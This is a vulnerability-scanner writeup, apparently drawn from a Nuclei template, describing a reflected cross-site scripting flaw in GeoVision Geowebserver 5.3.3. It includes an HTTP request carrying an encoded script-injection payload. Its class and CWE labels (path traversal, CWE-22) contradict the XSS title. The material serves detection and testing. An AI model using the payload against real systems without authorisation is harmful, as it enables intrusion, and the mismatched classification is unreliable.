# Nuclei Template: GeoVision Geowebserver 5.3.3 - Cross-Site Scripting
**Template ID:** geowebserver-xss
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`geovision-geowebserver-xss.yaml`)

## Vulnerability Information & PoC

## Description
GeoVision Geowebserver 5.3.3 and prior versions are vulnerable to several cross-site scripting / HTML injection / local file inclusion / XML injection / code execution vectors because the application fails to properly sanitize user requests.

## Steps to reproduce / Exploit Payload
```http
GET /Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

## References
- https://packetstormsecurity.com/files/163860/geovisiongws533-lfixssxsrfexec.txt
